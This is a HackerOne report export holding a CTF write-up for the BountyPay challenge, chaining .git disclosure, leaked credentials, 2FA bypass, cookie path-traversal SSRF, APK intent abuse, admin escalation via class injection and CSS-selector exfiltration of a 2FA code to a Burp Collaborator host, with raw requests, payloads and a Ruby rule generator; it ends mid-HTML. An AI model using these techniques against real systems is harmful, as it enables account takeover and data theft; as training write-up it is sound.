{"id":888331,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODgzMzE=","url":"https://hackerone.com/reports/888331","title":"[H1-2006 2020]  ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-06-01T10:40:47.915Z","submitted_at":"2020-06-01T10:40:47.915Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"pirateducky","url":"/pirateducky","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/266/095/949ef99b936641cccafd7d5cfd5082c09f6dd085_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"https://hackyholidays.h1ctf.com","about":"Please help us stop the Grinch!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-18T15:24:52.434Z","bug_reporter_agreed_on_going_public_at":"2020-06-18T13:36:17.931Z","team_member_agreed_on_going_public_at":"2020-06-18T15:24:52.370Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Still working on the report figured I should turn it in though :D\n\n## Impact\n\nhugeee","vulnerability_information_html":"\u003cp\u003eStill working on the report figured I should turn it in though :D\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003ehugeee\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-07-18T13:36:17.973Z","allow_singular_disclosure_after":-14146210.964704676,"singular_disclosure_allowed":true,"vote_count":3,"voters":["sw33tlie","nytr0gen","brahim_boufakri01"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":48138,"asset_type":"URL","asset_identifier":"*.bountypay.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8222184,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"{F857599}\nAs before the CTF started with a tweet from the H1 account - CEO @martenmickos needs to approve the May bug bounty payments but he lost his credentials for BountyPay - I might be able to help.\n\n----------------------------------------------------------------------------------------------\n### summary\nI was able to retrieve the CEO's account \u0026 pay the hackers by using a chain of exploits:\n\ninformation disclosure(github repo) â†’ account takeover(brian.oliver) + 2FA bypass -\u003e ssrf to download private apk â†’ token leaked in apk â†’ account takeover(sandra.allison) + privilege escalation(csrf) â†’ account takeover(marten.mickos) + 2FA bypass\n\n**password:** h\u0026H5wy2Lggj*kKn4OD\u0026Ype\n\n#### PoC\n{F857587}\n\nI attached the script in which I automated everything except the android part ðŸ¤–\n```bash\n$ gem install httparty nokogiri colorize\n$ ruby pwn-script.rb\n``` \n{F857598}\n\n### details\nThere's a H1 page for the program so let's check out the scope\n\n`scope: *.bountypay.h1ctf.com`\n\nThat's a wide scope - the best thing to do is to start with some subdomain enumeration, let's see what else is under that `bountypay` subdomain:\n\n- [api.bountypay.h1ctf.com](http://api.bountypay.h1ctf.com/)\n    - requires a token\n    - `/redirect?url=`\n- [www.bountypay.h1ctf.com](http://www.bountypay.h1ctf.com/)\n    - sign-in portal\n- [software.bountypay.h1ctf.com](http://software.bountypay.h1ctf.com/)\n    - apk is hosted here\n    - only accessible from known IP\n- [staff.bountypay.h1ctf.com](http://staff.bountypay.h1ctf.com/)\n    - staff portal\n    - `AIM` (administrators, regular staff)\n- [app.bountypay.h1ctf.com](http://app.bountypay.h1ctf.com/)\n    - customer portal\n    - 2 Factor Auth. is enabled\n\n### foothold\n\nAfter going through the subdomains and doing some directory bruteforcing - there was a `403` error that looked promising: `app.bountypay.h1ctf.com/.git/`, let's see if someone left some `git` files for us to view.\n\nIf you hit `http://app.bountypay.h1ctf.com/.git/HEAD` you can download the `HEAD` file - now we just need to get something with more information for us, let's try [`https://app.bountypay.h1ctf.com/.git/config`](https://app.bountypay.h1ctf.com/.git/config) This discloses some information:\n\n```bash\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = https://github.com/bounty-pay-code/request-logger.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n```\nThis config file discloses a [github](https://github.com/bounty-pay-code/request-logger.git) repository with some interesting information\n```php\n\u003c?php\n\n$data = array(\n  'IP'        =\u003e  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =\u003e  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =\u003e  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =\u003e  array(\n      'GET'   =\u003e  $_GET,\n      'POST'  =\u003e  $_POST\n  )\n);\n\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n```\nA few things to note here:\n- Application uses PHP\n- Writes to a log file that we can access from [`https://app.bountypay.h1ctf.com/bp_web_trace.log`](https://app.bountypay.h1ctf.com/bp_web_trace.log) in it we can see the following:\n  - The values are encoded using `base64`\n  - \"username\":\"brian.oliver\",\n  - \"password\":\"V7h0inzX\",\n  - \"challenge_answer\":\"bD83Jk27dQ\"\n\n\n### app.bountypay.h1ctf.com\n\nUsing the `username/password` works and we can now log into `[app.bountypay.h1ctf.com](http://app.bountypay.h1ctf.com)` however...there's `2 Factor Auth` we'll need to bypass it.\n{F857589}\n```html\n\u003c!-- relevant html from above--\u003e\n...\n\u003c!-- user's name --\u003e\n\u003cinput type=\"hidden\" name=\"username\" value=\"brian.oliver\"\u003e\n\u003c!-- user's password --\u003e\n\u003cinput type=\"hidden\" name=\"password\" value=\"V7h0inzX\"\u003e\n\u003c!-- MD5 hash of the 10 char passcode sent to the user for verification --\u003e\n\u003cinput type=\"hidden\" name=\"challenge\" value=\"103fa83db8f4be6c61dee66f95e2bca0\"\u003e\n...\n```\n\nWe can assume the application will send a verification code but how can we grab it? \n\nI had not noticed but the `challenge` value is 32 chars - after some time I realized `MD5` hashes have 32 chars, if we replace the `challenge` value for the `MD5` hash of the `challenge_answer` we found in the logs(bD83Jk27dQ) we can use this old token to gain access to the account. With this we can log into [app.bountypay.h1ctf.com](http://app.bountypay.h1ctf.com)\n\n### app.bountypay.h1ctf.com\n\nThe user `brian.oliver` has access to this application, however there wasn't much else so I started looking at `api` calls - I noticed the `/statements?month=04\u0026year=2020` request which was in the log file from before, and this is what it returned:\n```json\n{\n   \"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=01\u0026year=2020\",\n   \"data\":\"{\\\"description\\\":\\\"Transactions for 2020-01\\\",\\\"transactions\\\":[]}\"\n}\n```\nLooks like it's using `api.bountypay.h1ctf.com` to get the information and then it returns a data object with the information - let's remember this and keep going.\n\nEventually I looked at the `Cookie` values, and with some nudges noticed there was a path traversal in the cookie, which was just `base64` json, the account_id probably gets passed to the api call to get the right account - this is when the `/redirect?url=` route from `api.bountypay.h1ctf.com` came in handy since before we couldn't make any interesting requests because there was a `whitelist` - here it's also important to note the `software.bountypay.h1ctf.com` subdomain which you can't access because there's an IP restriction(I tried the `X-Forward-Host` but it didn't work), taking that into consideration - let's try to make an internal request to that subdomain by using the following `base64` encoded payload:\n\n```json\n// decoded cookie\n{\"account_id\":\"8FJ3KFISL3/../../../redirect?url=https://software.bountypay.h1ctf.com/BountyPay.apk#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2In0\"}\n\n// request\nGET /statements?month=04\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nX-Requested-With: XMLHttpRequest\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://app.bountypay.h1ctf.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSy8uLi8uLi8uLi9yZWRpcmVjdD91cmw9aHR0cHM6Ly9zb2Z0d2FyZS5ib3VudHlwYXkuaDFjdGYuY29tLyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ\n\n// response\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Mon, 01 Jun 2020 22:58:07 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 1621\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/..\\/..\\/..\\/redirect?url=https:\\/\\/software.bountypay.h1ctf.com\\/#\\/statements?month=04\u0026year=2020\",\"data\":\"\u003c!DOCTYPE html\u003e\\n\u003chtml lang=\\\"en\\\"\u003e\\n\u003chead\u003e\\n    \u003cmeta charset=\\\"utf-8\\\"\u003e\\n    \u003cmeta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\"\u003e\\n    \u003cmeta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1\\\"\u003e\\n    \u003ctitle\u003eSoftware Storage\u003c\\/title\u003e\\n    \u003clink href=\\\"\\/css\\/bootstrap.min.css\\\" rel=\\\"stylesheet\\\"\u003e\\n\u003c\\/head\u003e\\n\u003cbody\u003e\\n\\n\u003cdiv class=\\\"container\\\"\u003e\\n    \u003cdiv class=\\\"row\\\"\u003e\\n        \u003cdiv class=\\\"col-sm-6 col-sm-offset-3\\\"\u003e\\n            \u003ch1 style=\\\"text-align: center\\\"\u003eSoftware Storage\u003c\\/h1\u003e\\n            \u003cform method=\\\"post\\\" action=\\\"\\/\\\"\u003e\\n                \u003cdiv class=\\\"panel panel-default\\\" style=\\\"margin-top:50px\\\"\u003e\\n                    \u003cdiv class=\\\"panel-heading\\\"\u003eLogin\u003c\\/div\u003e\\n                    \u003cdiv class=\\\"panel-body\\\"\u003e\\n                        \u003cdiv style=\\\"margin-top:7px\\\"\u003e\u003clabel\u003eUsername:\u003c\\/label\u003e\u003c\\/div\u003e\\n                        \u003cdiv\u003e\u003cinput name=\\\"username\\\" class=\\\"form-control\\\"\u003e\u003c\\/div\u003e\\n                        \u003cdiv style=\\\"margin-top:7px\\\"\u003e\u003clabel\u003ePassword:\u003c\\/label\u003e\u003c\\/div\u003e\\n                        \u003cdiv\u003e\u003cinput name=\\\"password\\\" type=\\\"password\\\" class=\\\"form-control\\\"\u003e\u003c\\/div\u003e\\n                    \u003c\\/div\u003e\\n                \u003c\\/div\u003e\\n                \u003cinput type=\\\"submit\\\" class=\\\"btn btn-success pull-right\\\" value=\\\"Login\\\"\u003e\\n            \u003c\\/form\u003e\\n        \u003c\\/div\u003e\\n    \u003c\\/div\u003e\\n\u003c\\/div\u003e\\n\u003cscript src=\\\"\\/js\\/jquery.min.js\\\"\u003e\u003c\\/script\u003e\\n\u003cscript src=\\\"\\/js\\/bootstrap.min.js\\\"\u003e\u003c\\/script\u003e\\n\u003c\\/body\u003e\\n\u003c\\/html\u003e\"}\n```\nThe `data` json contains the login page for `software.bountypay.h1ctf.com` - this means we have a way to make requests inside the network, bypassing the ip restriction aka ssrf :yay: \nAfter some time of thinking what could be there I figure it would have something to download and it made sense, a lot of companies host software on a different subdomain under `/downloads, /software` or in this case `/uploads` making the correct request yields\n\n```bash\n# decoded cookie\n{\"account_id\":\"F8gHiqSdpK/../../../redirect?url=https://software.bountypay.h1ctf.com/uploads#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n\n# request\nGET /statements?month=04\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nX-Requested-With: XMLHttpRequest\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://app.bountypay.h1ctf.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSy8uLi8uLi8uLi9yZWRpcmVjdD91cmw9aHR0cHM6Ly9zb2Z0d2FyZS5ib3VudHlwYXkuaDFjdGYuY29tL3VwbG9hZHMjIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0=\n\n# data response\n\"data\":\"\u003chtml\u003e\\n\u003chead\u003e\u003ctitle\u003eIndex of \\/uploads\\/\u003c\\/title\u003e\u003c\\/head\u003e\\n\u003cbody bgcolor=\\\"white\\\"\u003e\\n\u003ch1\u003eIndex of \\/uploads\\/\u003c\\/h1\u003e\u003chr\u003e\u003cpre\u003e\u003ca href=\\\"..\\/\\\"\u003e..\\/\u003c\\/a\u003e\\n\u003ca href=\\\"\\/uploads\\/BountyPay.apk\\\"\u003eBountyPay.apk\u003c\\/a\u003e                                        20-Apr-2020 11:26              4043701\\n\u003c\\/pre\u003e\u003chr\u003e\u003c\\/body\u003e\\n\u003c\\/html\u003e\\n\"\n```\nWe can see what's hosted there ðŸ‘€ now you can download the `apk` by going to: [https://software.bountypay.h1ctf.com/uploads/BountyPay.apk](https://software.bountypay.h1ctf.com/uploads/BountyPay.apk) \n\n### apk\n\nThis part was hard for me, but thanks again to Al-Madjus I was able to complete it using `adb` and generating intents with the correct payloads, all the information was inside the apk.\n\nI used `android studio` and `adb` (if you have the emulator running you just need to run a shell by using `adb` `$ adb shell`)to complete the challenges:\n\n- ActivityOne\n    - `am start -a android.intent.action.VIEW -d \"one://part?start=PartTwoActivity\" -n bounty.pay/.PartOneActivity`\n- ActivityTwo\n    - `am start -a android.intent.action.VIEW -d \"two://part?two=light\u0026switch=on\" -n bounty.pay/.PartTwoActivity`\n- ActivityThree\n    - `am start -a android.intent.action.VIEW -d \"three://part?three=UGFydFRocmVVlQWN0aXZpdHk=\u0026switch=b24=\u0026header=X-Token\" -n bounty.pay/.PartThreeActivity`\n- Header value: `X-Token: 8e9998ee3137ca9ade8f372739f062c1` \n\nAll the params were in the `apk` - once you read the disassembled code you could see the flow of the program and use those to create the intents you needed - again huge thanks to AlMadjus for the help here.\n\nAfter completing this challenge we have access to a leaked token: `X-Token: 8e9998ee3137ca9ade8f372739f062c1` which I grabbed from the cat log from android studi.\nWe also know that we need to add that header with the token somewhere - if I remember correctly one of the subdomains asked specifically for a token when making requests directly to it: `api.bountypay.h1ctf.com`\n\n### api.bountypay.h1ctf.com\n\nUsing the new `X-Token: 8e9998ee3137ca9ade8f372739f062c1` header, let's test the `api` endpoint and see if I can now make requests, I found the `/api/staff` endpoint which yields:\n\n```json\n[{\n\t\"name\":\"Sam Jenkins\",\n\t\"staff_id\":\"STF:84DJKEIP38\"\n},\n{\n\t\"name\":\"Brian Oliver\",\n\t\"staff_id\":\"STF:KE624RQ2T9\"\n}]\n```\n\nHere I took a small detour and went on twitter - the [HackerOne](https://twitter.com/BountypayHQ/status/1258692145252270080) account released some clues, including a twitter account for `bountypay` which only followed three accounts which included the [newest](https://twitter.com/SandraA76708114) employee and she even shared a pic of her cool new work badge with her `STF` number on it- let's use that try to use that somewhere.\nIn the above `GET` request to `/api/staff` we get the current employees and their `staff_id` which is the same format that Sandra's badge has! but she's not in the system yet? Maybe she hasn't gotten set up yet? Let's help her out. After sending an inital `POST` request without any parms I received this error `\"Missing Parameter\"` so what paramet can we pass? her name? I don't think so maybe her staff_id is workin - let's try it:\n\n```bash\n// POST to create an account using th STF number in the image\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nConnection: close\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 23\nContent-Type: application/x-www-form-urlencoded\n\nstaff_id=STF:8FJ3KFISL3\n\n// response with username and password! \nHTTP/1.1 201 Created\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sun, 31 May 2020 22:11:43 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 110\n\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\n\nNow we have a `staff` account! which should work for the `staff.bountypay.h1ctf.com`\n\n### staff.bountypay.h1ctf.com\nWith our new `staff` account we can sign into the [staff.bountypay.h1ctf.com](http://staff.bountypay.h1ctf.com) application, there's a few things to note here:\n\n1. We get some clientside `js`\n    - `/js/website.js`\n2. The account is **not** admin and we probably need admin rights to see more\n    - `/template=admin` gives 403\n3. We control the `profile_avatar` input name since we can change it clientside however sensitive chars are filtered, we also control our user name but this wasn't of much use here\n    - injection is possible though \n\nWhen looking at the `website.js` file I noticed \n- The `upgradeToAdmin` function, I tried to hit the route myself but only admins can do it (it's a `GET` request to /admin/upgrade?username=sandra.allison)\n- The `sendReport` function that submits a `url` which is generated by the app and it's `base64 encoded` the url is generated for each page - the modal mentions an admin will take a look at the page, this is great if we can trick the admin into making that upgrade request for us, we could become admins too. \n\n```javascript\n// javascript from the application\n$('.upgradeToAdmin').click(function () {\n  let t = $('input[name=\"username\"]').val();\n  $.get('/admin/upgrade?username=' + t, function () {\n    alert('User Upgraded to Admin')\n  })\n}),\n$('.tab').click(function () {\n  return $('.tab').removeClass('active'),\n  $(this).addClass('active'),\n  $('div.content').addClass('hidden'),\n  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),\n  !1\n}),\n$('.sendReport').click(function () {\n  $.get('/admin/report?url=' + url, function () {\n    alert('Report sent to admin team')\n  }),\n  $('#myModal').modal('hide')\n}),\ndocument.location.hash.length \u003e 0 \n\u0026\u0026 ('#tab1' === document.location.hash \n\u0026\u0026 $('.tab1').trigger('click'), '#tab2' === document.location.hash \u0026\u0026 $('.tab2').trigger('click'), '#tab3' === document.location.hash \u0026\u0026 $('.tab3').trigger('click'), '#tab4' === document.location.hash \u0026\u0026 $('.tab4').trigger('click'));}\n```\n\n### document.hash\n\nI spent a lot of time trying to get `xss` since there was an html injection in the `avatar_name` input value when choosing an avatar under the `Profile` tab. I realized I controlled a field that gets echoed back as a class and if I could just trigger the `.upgradeToAdmin` function, I might be able to store that in the `profile_avatar` variable that I control, the last part was getting the admin to make the request. \n\nHow do we trigger the function though? \nWell since we control a class and there's a class that get's used in the `jquery` above to check the tabs and then fire their `click` events could we take advantage of that event and use it for our purposes? Yes we can! \n{F853204}\nBy setting a avatar with the `avatar_name` input value  to `tab1 upgradeToAdmin` and then accessing the hash we set in our `avatar_name` directly [https://staff.bountypay.h1ctf.com/#tab1](https://staff.bountypay.h1ctf.com/#tab1) this makes the `click` event propagate, and it even makes the request for us since it fires off the `click` event for `upgradeToAdmin` however - we are missing something:\n\n```\n// upgradeToAdmin function \nlet t = $('input[name=\"username\"]').val();\n```\n\nThe function needs to grab the username from an input field, I knew I was on the right track because I could see the request to `/admin/upgrade?username=undefined`. The `undefined` happened because the function that triggered the request grabs the `username` from an input field named `username` which is no where in the application - or is it? \n\n\u003e the event propagation surprised me and at first I didn't understand it but after debugging the jquery it hit me that since the location hash was being used to fire off a `click` event the event propagation would make any class that was in the same element fire off any click events that were associated with that class and luckily for us the request we need to make is handled by a click event bound to a class - with our injection we can inject the class that starts the click event and then the class name that fires our get request\n\n### input[name='username'].val()\n\nThis is the last part before we can send our admin a malicious link that will upgrade us, but how can we get that `username` parameter? \nThe only input with the `username` value is the login page - I knew we had to include that page since there's no other way, and we know we are using templates because the route we are on is `/?template=home` since we need to pull multiple templates I thought about array params - which even `hackerone` uses and made the following request [https://staff.bountypay.h1ctf.com/?template[]=home\u0026template[]=login](https://staff.bountypay.h1ctf.com/?template%5B%5D=home\u0026template%5B%5D=login)\n{F857590}\nBuilding up from this we can change our payload slightly to fill in the `username` and make sure we direct the admin to a page where our username will be seen since the only part of the application that is not in the `/template=home` is the ticket where our username is available to the admin and we need to make sure the class we set is seen by the admin to trigger the attack so let's just send the admin there with our full payload:\n\n[https://staff.bountypay.h1ctf.com/?template[]=login\u0026username=sandra.allison\u0026template[]=ticket\u0026ticket_id=3582#tab2](https://staff.bountypay.h1ctf.com/?template%5B%5D=login\u0026username=sandra.allison\u0026template%5B%5D=ticket\u0026ticket_id=3582#tab2)\n\nThis will take the admin to the ticket template but will also pull in the login template and use the input field with our username - now when the admin receives this payload it will trigger the attack, to do this we can send a report to `/admin/report?url=base64` the `base64` will be our payload since that includes our malicious link - now this will trigger the admin to make the upgrade request and we will become application admininstrator:\n\nNow all we need is to set the `avatar_name` value to `tab2 upgrateToAdmin` in the profile tab, submit the change, and then send the report to the admin:\n\n[https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjE=](https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjE=)\n\nThis request will trigger the `upgradeToAdmin` from the admin's side - giving us admin rights!\n\n### Admin\n\nNow that we are admin there's a new tab! With the CEO's account and password (which he forgot - should have been admin:admin)\n\n{F857591}\n\nSo what's left to do? Login of course! this account will work in [app.bountypay.h1ctf.com](http://app.bountypay.h1ctf.com) - when you login you'll need to bypass the  `2FA` again this time we don't have a used security code so just make one up `12345aBcDF= b3e2bc9cbb5e0b624816fa0ee19a7993` exchange the `challenge` value for the `md5` hash and it should allow you to log in - now let's pay those hackers!\n{F857592}\nIf you try to use the `pay` button you'll be redirected to...another 2FA - this one is not as easy as a `md5` hash. Let's take a look at the `2FA` page and html that we got to work with\n\n```html\n...\n\u003c!--important part --\u003e\n\u003cform method=\"post\"\u003e\n\u003cinput type=\"hidden\" name=\"app_style\" value=\"https://www.bountypay.h1ctf.com/css/uni_2fa_style.css\"\u003e\n...\n```\n\nThis snippet caught my eye - they're sending the styling for what I believe is the `2FA` application to grab the code - I replaced the css link and put a `burp` collaborator link to see if I could get a response from wherever that request ended up at and...\n{F857593}\nNow we're talking - but this was done through a css link, also how in the f*** do I exfiltrate this with just css? \n\nOne thing I noticed from the css that was originally there was the rules and comment from the css style made me think that I needed to steal a token from an application that looked like your typical `2FA` app with multiple input fields: [][][][][][][]\n\n### css data exfiltration\n\nWho would I tell I'd be exfiltrating information using `css selectors` - 2020 is a strange year. \n\nRealizing that was a posibility thanks to [d0nut](https://twitter.com/d0nutptr) and the blog he wrote [here](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b). I could technically add my own `css` stylesheet by submitting one in a server I controlled - with this and some crafty payloads I was able to grab all the `inputs` \n\nI was able to find the chars I needed by:\n\n- hosting a css file with my payloads on a server I controlled (I used netlify since they give u a server in which you can host js, css files, and comes with a SSL cert)\n- payloads were generated based on the criteria I needed\n    - charset: [a-z][A-Z][0-9]\n    - 7 characters (that's how many fit in the input field)\n    - Generated a list that would only execute the css rule each time a match was found, when the css selector would find a match it would execute the rule which in this case made a request to the `collaborator` along with the match and the placement.\n    - burp helped since I attached the current character and place (based on the nth-of-type(n) selector)\n    - Example payload\n        - input[value=a]:nth-of-type(1){background-image:url(\"[https://hellothere.burpcollaborator.net.burpcollaborator.net?char=a\u0026order=1](https://jl8b9zsipw6zj5g9q4f2kpvf369zxo.burpcollaborator.net.burpcollaborator.net/?a=A\u0026i=1)\");}\n        - if the css found that the first input had a value of `a` I would get a callback to my collaborator instance with the character and it's index\n    - I had about 400 css rules\n\n```ruby\n# creates a wordlist with css rules to find the auth code\nchars = (0..9).to_a + ('A'..'Z').to_a + ('a'..'z').to_a\n\nputs \"server/burp collaborator\"\n\nserver = gets.chomp\nfor i in 0..6\n\tchars.each do |char|\n\t\tputs \"input[value=#{char}]:nth-of-type(#{i + 1}){background-image:url('#{server}/?char=#{char}\u0026index=#{i + 1}');}\"\n\tend\nend\n```\n\nThis took...a few tries but finally I managed to grab the right code and....\n{F857595}\n### Thoughts\n\nI just want to say thank you to H1 and everyone involved in making these challenges, my first one was back in 2018 for DefCon, and I failed miserably. I told myself I would give it my best and I think I did just that. As always awesome challenge - I walked away with some new knowledge and more appreciation for css ðŸ¦†. \n","markdown_message":"\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2020-06-01_at_7.28.31_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/emrHgwaZ5eaKghdsemMuZfUp?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_7.28.31_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_7.28.31_AM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070628Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=d574e4abe52fc527e65a4ed678efedc21f64c025957728a062533056463c665a\" data-attachment-type=\"image/png\"\u003e\u003cimg 